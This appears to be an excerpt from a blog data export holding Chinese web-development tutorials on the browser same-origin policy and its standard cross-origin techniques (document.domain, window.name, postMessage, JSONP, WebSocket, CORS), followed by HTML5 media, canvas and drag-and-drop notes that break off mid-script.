title=\"同源包括三个相同\"></a>同源包括三个相同</h3><ul>\n<li>协议（protocol）相同</li>\n<li>域名（domain/host）相同</li>\n<li>端口（port）相同</li>\n</ul>","more":"<p>举例来说，对于<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略）。它的同源情况如下。</p>\n<ul>\n<li><a href=\"http://www.example.com/dir2/other.html：同源\">http://www.example.com/dir2/other.html：同源</a></li>\n<li><a href=\"http://example.com/dir/other.html：不同源（域名不同）\">http://example.com/dir/other.html：不同源（域名不同）</a></li>\n<li><a href=\"http://v2.www.example.com/dir/other.html：不同源（域名不同）\">http://v2.www.example.com/dir/other.html：不同源（域名不同）</a></li>\n<li><a href=\"http://www.example.com:81/dir/other.html：不同源（端口不同）\">http://www.example.com:81/dir/other.html：不同源（端口不同）</a></li>\n</ul>\n<p>更多例子：</p>\n<table>\n<thead>\n<tr>\n<th>URL</th>\n<th>说明</th>\n<th>是否允许通信</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"http://www.a.com/a.js\">http://www.a.com/a.js</a><br><a href=\"http://www.a.com/b.js\">http://www.a.com/b.js</a></td>\n<td>同一域名下</td>\n<td>允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com/lab/a.js\">http://www.a.com/lab/a.js</a><br><a href=\"http://www.a.com/script/b.js\">http://www.a.com/script/b.js</a></td>\n<td>同一域名下不同文件夹</td>\n<td>允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com:8000/a.js\">http://www.a.com:8000/a.js</a><br><a href=\"http://www.a.com/b.js\">http://www.a.com/b.js</a></td>\n<td>同一域名，不同端口</td>\n<td>不允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com/a.js\">http://www.a.com/a.js</a><br><a href=\"https://www.a.com/b.js\">https://www.a.com/b.js</a></td>\n<td>同一域名，不同协议</td>\n<td>不允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com/a.js\">http://www.a.com/a.js</a><br><a href=\"http://70.32.92.74/b.js\">http://70.32.92.74/b.js</a></td>\n<td>域名和域名对应ip</td>\n<td>不允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com/a.js\">http://www.a.com/a.js</a><br><a href=\"http://script.a.com/b.js\">http://script.a.com/b.js</a></td>\n<td>主域相同，子域不同</td>\n<td>不允许</td>\n</tr>\n<tr>\n<td><a href=\"http://www.a.com/a.js\">http://www.a.com/a.js</a><br><a href=\"http://a.com/b.js\">http://a.com/b.js</a></td>\n<td>同一域名，不同二级域名（同上）</td>\n<td>不允许（cookie这种情况下也不允许访问）</td>\n</tr>\n<tr>\n<td><a href=\"http://www.cnblogs.com/a.js\">http://www.cnblogs.com/a.js</a><br><a href=\"http://a.com/b.js\">http://a.com/b.js</a></td>\n<td>不同域名</td>\n<td>不允许</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>注意</p>\n<ol>\n<li>如果是协议和端口造成的跨域问题“前台”是无能为力的，</li>\n<li>在跨域问题上，域仅仅是通过“URL的首部”来识别而不会去尝试判断相同的ip地址对应着两个域或两个域是否在同一个ip上。</li>\n</ol>\n<blockquote>\n<p>“URL的首部”指<code>window.location.protocol</code> + <code>window.location.host</code>，也可以理解为“Domains, protocols and ports must match”。</p>\n</blockquote>\n</blockquote>\n<h3 id=\"同源策略的目的\"><a href=\"#同源策略的目的\" class=\"headerlink\" title=\"同源策略的目的\"></a>同源策略的目的</h3><p>为了保证用户信息的安全，防止恶意的网站窃取数据。</p>\n<h3 id=\"受限制的行为\"><a href=\"#受限制的行为\" class=\"headerlink\" title=\"受限制的行为\"></a>受限制的行为</h3><ul>\n<li>Cookie、LocalStorage 和 IndexDB 无法读取。</li>\n<li>DOM 无法获得。</li>\n<li>AJAX 请求不能发送。</li>\n</ul>\n<h2 id=\"cookie跨域\"><a href=\"#cookie跨域\" class=\"headerlink\" title=\"cookie跨域\"></a>cookie跨域</h2><p>Cookie 是服务器写入浏览器的一小段信息，是储存在用户本地终端上的数据，通常被用来记录访问者的一些信息（尽管这并不安全），只有同源的网页才能共享。</p>\n<p>不过这个共享范围比同源稍宽松些。</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>如果两个网页一级域名相同，只是二级域名不同，那么浏览器允许通过设置document.domain来共享 Cookie。</p>\n<p>例如：</p>\n<ol>\n<li>对A,B网页同时设置：<code>document.domain = &#39;example.com&#39;;</code></li>\n<li>在A网页中通过脚本设置一个Cookie：<code>document.cookie = &quot;test1=hello&quot;;</code></li>\n<li>B网页就可以读到这个 Cookie：<code>var allCookie = document.cookie;</code></li>\n</ol>\n<blockquote>\n<p>注意：这种方法只适用于 Cookie 和 iframe 窗口（下一节会谈到），LocalStorage 和 IndexDB 无法通过这种方法规避同源政策，而要使用下文介绍的PostMessage API。</p>\n<p>另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如为<code>.example.com</code>设置<code>Set-Cookie: key=value; domain=.example.com; path=/</code>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。</p>\n</blockquote>\n<h2 id=\"iframe跨域\"><a href=\"#iframe跨域\" class=\"headerlink\" title=\"iframe跨域\"></a>iframe跨域</h2><p>如果两个网页不同源，就无法拿到对方的DOM。<br>典型的例子是<code>iframe</code>窗口和<code>window.open</code>方法打开的窗口，它们与父窗口无法通信。</p>\n<p>比如，父窗口运行下面的命令，如果<code>iframe</code>窗口不是同源，就会报错。</p>\n<pre><code>document.getElementById(&quot;myIFrame&quot;).contentWindow.document\n// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.\n</code></pre><p>上面命令中，父窗口想获取子窗口的DOM，因为跨源导致报错。<br>反之亦然，子窗口获取主窗口的DOM也会报错。</p>\n<pre><code>window.parent.document.body\n// 报错\n</code></pre><h3 id=\"解决办法-1\"><a href=\"#解决办法-1\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><h4 id=\"如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document-domain属性，就可以规避同源策略来访问DOM。\"><a href=\"#如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document-domain属性，就可以规避同源策略来访问DOM。\" class=\"headerlink\" title=\"如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document.domain属性，就可以规避同源策略来访问DOM。\"></a>如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的<code>document.domain</code>属性，就可以规避同源策略来访问DOM。</h4><p>举例如下</p>\n<p>在a.html中</p>\n<pre><code>document.domain = &apos;a.com&apos;;\nvar ifr = document.createElement(&apos;iframe&apos;);\nifr.src = &apos;http://script.a.com/b.html&apos;;\nifr.style.display = &apos;none&apos;;\ndocument.body.appendChild(ifr);\nifr.onload = function(){\n    var doc = ifr.contentDocument || ifr.contentWindow.document;\n    // 在这里操纵b.html\n    alert(doc.getElementsByTagName(&quot;h1&quot;)[0].childNodes[0].nodeValue);\n};\n</code></pre><p>b.html中</p>\n<pre><code>document.domain = &apos;a.com&apos;;\n</code></pre><h4 id=\"对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题\"><a href=\"#对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题\" class=\"headerlink\" title=\"对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题\"></a>对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题</h4><ol>\n<li>片段识别符（fragment identifier）</li>\n<li>设置<code>window.name</code></li>\n<li>跨文档通信API（Cross-document messaging）</li>\n</ol>\n<h5 id=\"片段标识符\"><a href=\"#片段标识符\" class=\"headerlink\" title=\"片段标识符\"></a>片段标识符</h5><p>片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如<code>http://example.com/x.html#fragment的#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</p>\n<p>父窗口可以把信息，写入子窗口的片段标识符。</p>\n<pre><code>var src = originURL + &apos;#&apos; + data;\ndocument.getElementById(&apos;myIFrame&apos;).src = src;\n</code></pre><p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>\n<pre><code>window.onhashchange = checkMessage;\n\nfunction checkMessage() {\n  var message = window.location.hash;\n  // ...\n}\n</code></pre><p>同样的，子窗口也可以改变父窗口的片段标识符。</p>\n<pre><code>parent.location.href= target + &quot;#&quot; + hash;\n</code></pre><h5 id=\"设置window-name\"><a href=\"#设置window-name\" class=\"headerlink\" title=\"设置window.name\"></a>设置<code>window.name</code></h5><p>浏览器窗口有<code>window.name</code>属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。</p>\n<p>有三个页面：</p>\n<ul>\n<li>a.com/app.html：应用页面。</li>\n<li>a.com/proxy.html：代理文件，一般是一个没有任何内容的html文件，需要和应用页面在同一域下。</li>\n<li>b.com/data.html：应用页面需要获取数据的页面，可称为数据页面。</li>\n</ul>\n<p>过程如下：</p>\n<ol>\n<li>在应用页面<code>（a.com/app.html）</code>中创建一个<code>iframe</code>，把其<code>src</code>指向数据页面<code>（b.com/data.html）</code>。数据页面<code>（b.com/data.html）</code>设置window.name时，由于同源，会自动把数据附加到这个<code>iframe</code>的<code>window.name</code>上，代码如下：<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n        window.name = &apos;I was there!&apos;;    //这里是要传输的数据，大小一般为2M，IE和firefox下可以大至32M左右。\n                                         //数据格式可以自定义，如json、字符串\n&lt;/script&gt;\n</code></pre></li>\n<li>在应用页面<code>（a.com/app.html）</code>中监听<code>iframe</code>的<code>onload</code>事件，在此事件中设置这个<code>iframe</code>的<code>src</code>指向本地域的代理文件（代理文件和应用页面在同一域下，所以可以相互通信）。app.html部分代码如下：<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    var state = 0, \n    iframe = document.createElement(&apos;iframe&apos;),\n    loadfn = function() {\n        if (state === 1) {\n            var data = iframe.contentWindow.name;    // 读取数据\n            alert(data);    //弹出&apos;I was there!&apos;\n        } else if (state === 0) {\n            state = 1;\n            iframe.contentWindow.location = &quot;http://a.com/proxy.html&quot;;    // 设置的代理文件，此时由于iframe的loaction改变，又一次触发load事件\n        }  \n    };\n    iframe.src = &apos;http://b.com/data.html&apos;;\n    if (iframe.attachEvent) {\n        iframe.attachEvent(&apos;onload&apos;, loadfn);\n    } else {\n        iframe.onload  = loadfn;\n    }\n    document.body.appendChild(iframe);\n&lt;/script&gt;\n</code></pre></li>\n<li>获取数据以后销毁这个<code>iframe</code>，释放内存；这也保证了安全（不被其他域frame js访问）。<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n    iframe.contentWindow.document.write(&apos;&apos;);\n    iframe.contentWindow.close();\n    document.body.removeChild(iframe);\n&lt;/script&gt;\n</code></pre></li>\n</ol>\n<p>总结起来即：iframe的src属性由外域转向本地域，跨域数据即由iframe的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。</p>\n<ul>\n<li>优点: window.name容量很大，可以放置非常长的字符串；</li>\n<li>缺点: 必须监听子窗口window.name属性的变化，影响网页性能。</li>\n</ul>\n<h5 id=\"跨文档通信API–postMessage\"><a href=\"#跨文档通信API–postMessage\" class=\"headerlink\" title=\"跨文档通信API–postMessage()\"></a>跨文档通信API–postMessage()</h5><p>HTML5新增一个<code>window.postMessage</code>方法，允许跨窗口通信，不论这两个窗口是否同源。并且支持基于web的实时消息传递。</p>\n<pre><code>otherWindow.postMessage(message, targetOrigin);\n</code></pre><ul>\n<li><code>otherWindow</code>: 对接收信息页面的window的引用。可以是页面中<code>iframe</code>的<code>contentWindow</code>属性；<code>window.open</code>的返回值；通过<code>name</code>或下标从<code>window.frames</code>取到的值。</li>\n<li><code>message</code>: 所要发送的数据，string类型。</li>\n<li><code>targetOrigin</code>: 用于限制otherWindow，即”协议 + 域名 + 端口”，<code>*</code>表示不限制域名，向所有窗口发送</li>\n</ul>\n<p>举例来说，父窗口<code>http://aaa.com</code>与子窗口<code>http://bbb.com</code>互发消息</p>\n<p>父-&gt;子</p>\n<pre><code>var popup = window.open(&apos;http://bbb.com&apos;, &apos;title&apos;);\npopup.postMessage(&apos;Hello World!&apos;, &apos;http://bbb.com&apos;);\n</code></pre><p>子-&gt;父</p>\n<pre><code>window.opener.postMessage(&apos;Nice to see you&apos;, &apos;http://aaa.com&apos;);\n</code></pre><p>接受消息：message事件</p>\n<pre><code>window.addEventListener(&apos;message&apos;, function(e) {\n  console.log(e.data);\n},false);\n</code></pre><p><code>message</code>事件的事件对象<code>event</code>，提供以下三个属性。</p>\n<ul>\n<li>event.source：发送消息的窗口</li>\n<li>event.origin: 消息发向的网址</li>\n<li>event.data: 消息内容</li>\n</ul>\n<p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p>\n<pre><code>window.addEventListener(&apos;message&apos;, receiveMessage);\nfunction receiveMessage(event) {\n  event.source.postMessage(&apos;Nice to see you!&apos;, &apos;*&apos;);\n}\n</code></pre><p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p>\n<pre><code>window.addEventListener(&apos;message&apos;, receiveMessage);\nfunction receiveMessage(event) {\n  if (event.origin !== &apos;http://aaa.com&apos;) return;\n  if (event.data === &apos;Hello World&apos;) {\n      event.source.postMessage(&apos;Hello&apos;, event.origin);\n  } else {\n    console.log(event.data);\n  }\n}\n</code></pre><h2 id=\"Ajax跨域\"><a href=\"#Ajax跨域\" class=\"headerlink\" title=\"Ajax跨域\"></a>Ajax跨域</h2><p>同源政策规定，AJAX请求只能发给同源的网址。</p>\n<p>除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。</p>\n<ul>\n<li>JSONP</li>\n<li>WebSocket</li>\n<li>CORS</li>\n</ul>\n<h3 id=\"JSONP\"><a href=\"#JSONP\" class=\"headerlink\" title=\"JSONP\"></a>JSONP</h3><p>JSONP是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。</p>\n<p>它的基本思想是，网页通过添加一个<code>&lt;script&gt;</code>元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。</p>\n<p>举个例子</p>\n<pre><code>function addScriptTag(src) {\n  var script = document.createElement(&apos;script&apos;);\n  script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;);\n  script.src = src;\n  document.body.appendChild(script);\n}\n\nwindow.onload = function () {\n  addScriptTag(&apos;http://example.com/ip?callback=foo&apos;);\n}\n\nfunction foo(data) {\n  console.log(&apos;Your public IP address is: &apos; + data.ip);\n};\n</code></pre><p>上面代码通过动态添加<code>&lt;script&gt;</code>元素，向服务器<code>example.com</code>发出请求。</p>\n<blockquote>\n<p>注意：该请求的查询字符串有一个<code>callback</code>参数（在服务器中须对其进行相关声明和定义），用来指定回调函数的名字，这对于JSONP是必需的。假设目标返回的数据是<code>[&quot;customername1&quot;,&quot;customername2&quot;]</code>那么真正返回到客户端的数据为<code>foo([&quot;customername1&quot;,&quot;customername2&quot;])</code></p>\n</blockquote>\n<p>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。</p>\n<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤。</p>\n<h3 id=\"WebSocket跨域\"><a href=\"#WebSocket跨域\" class=\"headerlink\" title=\"WebSocket跨域\"></a>WebSocket跨域</h3><p>WebSocket是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p>\n<p>下面是一个例子，浏览器发出的WebSocket请求的头信息</p>\n<pre><code>GET /chat HTTP/1.1\nHost: server.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Protocol: chat, superchat\nSec-WebSocket-Version: 13\nOrigin: http://example.com\n</code></pre><p>上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。</p>\n<p>正是因为有了<code>Origin</code>这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p>\n<pre><code>HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=\nSec-WebSocket-Protocol: chat\n</code></pre><h3 id=\"CORS跨域\"><a href=\"#CORS跨域\" class=\"headerlink\" title=\"CORS跨域\"></a>CORS跨域</h3><p>跨源资源分享（Cross-Origin Resource Sharing）</p>\n<p>它是W3C标准，是跨源AJAX请求的根本解决方法。</p>\n<p>相比JSONP只能发GET请求，CORS允许任何类型的请求。</p>\n<p><a href=\"http://www.ruanyifeng.com/blog/2016/04/cors.html\">CORS跨域详细</a></p>\n<hr>\n<p>参考链接</p>\n<ul>\n<li><a href=\"http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html\">浏览器同源政策及其规避方法</a></li>\n<li><a href=\"http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html\">JavaScript跨域总结与解决办法</a></li>\n</ul>"},{"title":"HTML5新特性","_content":"\n### 目录\n\n* 用于绘画的 canvas 元素\n* 用于媒介回放的 video 和 audio 元素\n* 对本地离线存储的更好的支持\n* 新的特殊内容元素，比如 article、footer、header、nav、section\n* 新的表单控件，比如 calendar、date、time、email、url、search\n\n<!-- more -->\n\n## video标签\n\n\t<video width=\"320\" height=\"240\" controls=\"controls\" autoplay=\"autoplay\" loop=\"loop\">\n\t  \t<source src=\"movie.ogg\" type=\"video/ogg\">\n\t  \t<source src=\"movie.mp4\" type=\"video/mp4\">\n\t\tYour browser does not support the video tag.\n\t</video>\n\n* width：定义播放器宽度\n* height： 设置视频播放器的高度\n* controls：如果出现该属性，则向用户显示控件，播放按钮，音量，进度条，下载按钮等\n* autoplay： 如果出现该属性，则视频在就绪后马上播放。\n* loop：如果出现该属性，则当媒介文件完成播放后再次开始播放\n* preload：如果出现该属性，则视频在页面加载时进行加载，并预备播放。如果使用 \"autoplay\"，则忽略该属性\n* src：要播放的视频的 URL，也可以像上例中写在source标签里\n\nvideo 元素允许多个 source 元素。source 元素可以链接不同的视频文件。浏览器将使用第一个可识别的格式。\n\n`<video>` 与`</video>` 之间插入的内容是供不支持 video 元素的浏览器显示的：\n\n#### 支持格式\n\n|格式\t|IE\t\t|Firefox\t|Opera\t|Chrome|Safari|\n|-----------|-----------|----------|-----------|----------|--------|\n|Ogg\t|No\t\t|3.5+\t|10.5+\t|5.0+\t|No\t    |\n|MPEG 4\t|9.0+\t|No\t\t|No\t\t|5.0+\t|3.0+   |\n|WebM\t|No\t\t|4.0+\t|10.6+\t|6.0+\t|No      |\n\n* Ogg = 带有 Theora 视频编码和 Vorbis 音频编码的 Ogg 文件\n* MPEG4 = 带有 H.264 视频编码和 AAC 音频编码的 MPEG 4 文件\n* WebM = 带有 VP8 视频编码和 Vorbis 音频编码的 WebM 文件\n\n#### 方法，属性和事件\n\n|方法\t\t\t|属性\t\t\t|事件\t\t\t\t|\n|---------------|---------------|-------------------|\n|play()\t\t\t|currentSrc\t\t|play\t\t\t\t|\n|pause()\t\t|currentTime\t|pause\t\t\t\t|\n|load()\t\t\t|videoWidth\t\t|progress\t\t\t|\n|canPlayType\t|videoHeight\t|error\t\t\t\t|\n| \t\t\t\t|duration\t\t|timeupdate\t\t\t|\n|\t\t\t\t|ended\t\t\t|ended\t\t\t\t|\n|\t\t\t\t|error\t\t\t|abort\t\t\t\t|\n|\t\t\t\t|paused\t\t\t|empty\t\t\t\t|\n|\t\t\t\t|muted\t\t\t|emptied\t\t\t|\n|\t\t\t\t|seeking\t\t|waiting\t\t\t|\n|\t\t\t\t|volume\t\t\t|loadedmetadata\t\t|\n|\t\t\t\t|height\t\t\t| \t\t\t\t\t|\n|\t\t\t\t|width\t \t\t|\t\t\t\t\t||\n\n> 在所有属性中，只有 videoWidth 和 videoHeight 属性是立即可用的。在视频的元数据已加载后，其他属性才可用。\n\n## audio标签\n\n\t<audio src=\"song.ogg\" controls=\"controls\">\n\t\tYour browser does not support the audio tag.\n\t</audio>\n\n* autoplay：如果出现该属性，则音频在就绪后马上播放。\n* controls：如果出现该属性，则向用户显示控件，比如播放按钮。\n* loop：如果出现该属性，则每当音频结束时重新开始播放。\n* preload：如果出现该属性，则音频在页面加载时进行加载，并预备播放。如果使用 \"autoplay\"，则忽略该属性。\n* src：要播放的音频的 URL。\n\naudio 元素允许多个 source 元素。source 元素可以链接不同的音频文件。浏览器将使用第一个可识别的格式。\n\n`<audio>` 与 `</audio>` 之间插入的内容是供不支持 audio 元素的浏览器显示的。\n\n\n#### 支持格式\n\n|格式\t|IE9\t\t|Firefox3.5\t|Opera10.5\t|Chrome3.0|Safari3.0|\n|-----------|----------|-----------------|-----------------|---------------|-----------|\n|Ogg Vorbis\t|\t|YES\t\t\t|YES\t\t \t|YES\t         \t\t|\t        |\n|MP3\t|YES\t\t|\t\t\t|\t\t\t|YES\t\t\t|YES  \t|\n|Wav\t|\t\t|YES\t\t\t|YES\t\t\t|\t\t\t|YES      \t|\n\n## canvas\n\n\t<canvas id=\"myCanvas\"></canvas>\n\n\t<script type=\"text/javascript\">\n\t\tvar canvas=document.getElementById('myCanvas');\n\t\tvar ctx=canvas.getContext('2d');\n\t\tctx.fillStyle='#FF0000';\n\t\tctx.fillRect(0,0,80,100);\n\t</script>\n\n##### 浏览器支持\n\nInternet Explorer 8 以及更早的版本不支持 `<canvas> `标签。其他浏览器不识别但是会使用衬线体来直接显示其内所有内容。\n\n##### 标签定义和用法\n\n`<canvas>` 标签定义图形，比如图表和其他图像。但是它只提供图形容器，必须使用javascript来绘制图形。\n\n|属性\t|值\t|描述|\n|-------|---|----|\n|height\t|pixels\t|设置 canvas 的高度。|\n|width\t|pixels\t|设置 canvas 的宽度。|\n\n#### 使用javascript绘制\n\n[W3School参考链接](http://www.w3school.com.cn/tags/html_ref_canvas.asp)\n\n##### 颜色、样式和阴影\n\n|属性\t|描述|\n|-------|---|\n|fillStyle\t|设置或返回用于填充绘画的颜色、渐变或模式|\n|strokeStyle\t|设置或返回用于笔触的颜色、渐变或模式|\n|shadowColor\t|设置或返回用于阴影的颜色|\n|shadowBlur\t|设置或返回用于阴影的模糊级别|\n|shadowOffsetX\t|设置或返回阴影距形状的水平距离|\n|shadowOffsetY\t|设置或返回阴影距形状的垂直距离|\n\n|方法\t|描述|\n|-------|---|\n|createLinearGradient()\t|创建线性渐变（用在画布内容上）|\n|createPattern()\t|在指定的方向上重复指定的元素|\n|createRadialGradient()\t|创建放射状/环形的渐变（用在画布内容上）|\n|addColorStop()\t|规定渐变对象中的颜色和停止位置|\n\n##### 线条样式\n\n|属性\t|描述|\n|-------|---|\n|lineCap\t|设置或返回线条的结束端点样式|\n|lineJoin\t|设置或返回两条线相交时，所创建的拐角类型|\n|lineWidth\t|设置或返回当前的线条宽度|\n|miterLimit\t|设置或返回最大斜接长度|\n\n##### 矩形\n\n|方法\t|描述|\n|-------|---|\n|rect()\t|创建矩形|\n|fillRect()\t|绘制“被填充”的矩形|\n|strokeRect()\t|绘制矩形（无填充）|\n|clearRect()\t|在给定的矩形内清除指定的像素|\n\n##### 路径\n\n|方法\t|描述|\n|-------|---|\n|fill()\t|填充当前绘图（路径）|\n|stroke()\t|绘制已定义的路径|\n|beginPath()\t|起始一条路径，或重置当前路径|\n|moveTo()\t|把路径移动到画布中的指定点，不创建线条|\n|closePath()\t|创建从当前点回到起始点的路径|\n|lineTo()\t|添加一个新点，然后在画布中创建从该点到最后指定点的线条|\n|clip()\t|从原始画布剪切任意形状和尺寸的区域|\n|quadraticCurveTo()\t|创建二次贝塞尔曲线|\n|bezierCurveTo()\t|创建三次方贝塞尔曲线|\n|arc()\t|创建弧/曲线（用于创建圆形或部分圆）|\n|arcTo()\t|创建两切线之间的弧/曲线|\n|isPointInPath()\t|如果指定的点位于当前路径中，则返回 true，否则返回 false|\n\n##### 转换\n\n|方法\t|描述|\n|-------|---|\n|scale()\t|缩放当前绘图至更大或更小|\n|rotate()\t|旋转当前绘图|\n|translate()\t|重新映射画布上的 (0,0) 位置|\n|transform()\t|替换绘图的当前转换矩阵|\n|setTransform()\t|将当前转换重置为单位矩阵。然后运行 transform()|\n\n##### 文本\n\n|属性\t|描述|\n|-------|---|\n|font\t|设置或返回文本内容的当前字体属性|\n|textAlign\t|设置或返回文本内容的当前对齐方式|\n|textBaseline\t|设置或返回在绘制文本时使用的当前文本基线|\n\n|方法\t|描述|\n|-------|---|\n|fillText()\t|在画布上绘制“被填充的”文本|\n|strokeText()\t|在画布上绘制文本（无填充）|\n|measureText()\t|返回包含指定文本宽度的对象|\n\n\n##### 图像绘制\n\n|方法\t|描述|\n|-------|---|\n|drawImage()\t|向画布上绘制图像、画布或视频|\n\n##### 像素操作\n\n|属性\t|描述|\n|-------|---|\n|width\t|返回 ImageData 对象的宽度|\n|height\t|返回 ImageData 对象的高度|\n|data\t|返回一个对象，其包含指定的 ImageData 对象的图像数据|\n\n|方法\t|描述|\n|-------|---|\n|createImageData()\t|创建新的、空白的 ImageData 对象|\n|getImageData()\t|返回 ImageData 对象，该对象为画布上指定的矩形复制像素数据|\n|putImageData()\t|把图像数据（从指定的 ImageData 对象）放回画布上|\n\n#####　合成\n\n|属性\t|描述|\n|-------|---|\n|globalAlpha\t|设置或返回绘图的当前 alpha 或透明值|\n|globalCompositeOperation\t|设置或返回新图像如何绘制到已有的图像上|\n\n##### 其他\n\n|方法\t|描述|\n|-------|---|\n|save()\t|保存当前环境的状态|\n|restore()\t|返回之前保存过的路径状态和属性|\n|createEvent()\t ||\n|getContext()\t ||\n|toDataURL()|||\n\n> **`<canvas>` 标记和 SVG 以及 VML 之间的差异**\n`<canvas> `有一个基于 JavaScript 的绘图 API，而 SVG 和 VML 使用一个 XML 文档来描述绘图。\n这两种方式在功能上是等同的，任何一种都可以用另一种来模拟。从表面上看，它们很不相同，可是，每一种都有强项和弱点。例如，SVG 绘图很容易编辑，只要从其描述中移除元素就行。\n要从同一图形的一个 `<canvas>` 标记中移除元素，往往需要擦掉绘图重新绘制它。\n\n## 拖放\n\n\t<!DOCTYPE HTML>\n\t<html>\n\t<head>\n\t<style type=\"text/css\">\n\t\t#div1, #div2, #div3, #div4{\n\t\t\tfloat:left; \n\t\t\twidth:100px;\n\t\t\theight:100px;\n\t\t\tmargin:10px;\n\t\t\tpadding:10px;\n\t\t\tborder:1px solid #aaaaaa;\n\t\t}\n\t\t*{\n\t\t\ttransition:all 0.5s;\n\t\t}\n\t\t#dragDiv{\n\t\t\tbackground-color: #369;\n\t\t\twidth:100px;\n\t\t\theight:100px;\n\t\t}\n\t\t#mouseLocation{\n\t\t\tclear: both;\n\t\t\twidth: 265px;\n\t\t\tmargin-left: 10px;\n\t\t\ttext-align: center;\n\t\t}\n\t\t#crossDiv{\n\t\t\tclear: both;\n\t\t\tdisplay: inline-block;\n\t\t\theight: 200px;\n\t\t\twidth: 10px;\n\t\t\tbackground-color: #333;\n\t\t}\n\t\t#dragElement{\n\t\t\tfloat: left;\n\t\t\twidth: 120px;\n\t\t\theight: 120px;\n\t\t\tbackground-color: #369;\n\t\t\tmargin-left: -99999px;\n\t\t\topacity: 1;\n\t\t}\n\t\t#dragElement:click{\n\t\t\twidth: 150px;\n\t\t\theight: 150px;\n\t\t}\n\t</style>\n\t</head>\n\t<body>\n\t\n\t<div id=\"div1\" ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\" ondragleave=\"dragLeave(event)\">\n\t\t<div id=\"dragDiv\" draggable=\"true\" ondragstart=\"drag(event)\" ondrag=\"draging(event)\" ></div>\n\t</div>\n\t<div id=\"div2\" ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\" ondragleave=\"dragLeave(event)\"></div>\n\t<div id=\"mouseLocation\">X坐标：0，Y坐标：0</div>\n\t<div id=\"dragElement\"></div>\n\t<div id=\"div3\" ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\"></div>\n\t<div id=\"div4\" ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\"></div>\n\t\n\t<script type=\"text/javascript\">\n\t\tvar mouseLocation = document.getElementById(\"mouseLocation\");\n\t\tvar dragElement = document.getElementById(\"dragElement\");\n\t\n\t\tfunction draging(ev) {\n\t\t\tmouseLocation.innerHTML = \"X坐标：\" + ev.clientX + \"，Y坐标：\" + ev.clientY;\n\t\t}\n\t\n\t\tfunction allowDrop(ev){\n\t\t\tev.preventDefault();\n\t\t\tmouseLocation.style.backgroundColor = \"#333\";\n\t\t\tmouseLocation.style.color = \"#fff\";\n\t\t\tev.dataTransfer.dropEffect = \"copy\";\n\t\t}\n\t\n\t\tfunction dragLeave(ev) {\n\t\t\tmouseLocation.style.backgroundColor = \"#fff\";\n\t\t\tmouseLocation.style.color = \"#000\";\n\t\t}\n\t\n\t\tfunction drag(ev){\n\t\t\tev.dataTransfer.setData(\"Text\",ev.target.id);\n\t\t\tev.dataTransfer.setDragImage(dragElement, 60, 60);\n\t\t\tev.dataTransfer.effectAllowed = \"copy\";\n\t\t}\n\t\n\t\tfunction drop(ev) {\n\t\t\tev.preventDefault();\n\t\t\tvar data = 